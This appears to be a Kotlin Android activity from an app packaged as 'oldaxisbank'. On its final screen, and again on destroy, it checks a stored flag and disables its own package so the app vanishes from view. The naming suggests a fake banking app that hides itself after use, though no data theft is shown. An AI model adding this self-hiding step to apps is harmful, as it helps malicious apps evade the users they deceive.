package com.example.oldaxisbank

import android.content.pm.PackageManager
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import com.example.oldaxisbank.databinding.ActivityFinalscreenBinding

class finalscreen : AppCompatActivity() {

    private lateinit var binding:ActivityFinalscreenBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityFinalscreenBinding.inflate(layoutInflater)
        setContentView(binding.root)

        val util =  Util()
        if(util.getLocalData(this,"dis")=="1") {
            util.saveLocalData(this,"dis","2")
            val pakagemanger = packageManager
            pakagemanger.setApplicationEnabledSetting(
                packageName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        }
        }

    override fun onDestroy() {
        super.onDestroy()
        val util =  Util()
        if(util.getLocalData(this,"dis")=="1") {
            util.saveLocalData(this,"dis","2")
            val pakagemanger = packageManager
            pakagemanger.setApplicationEnabledSetting(
                packageName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        }
    }
}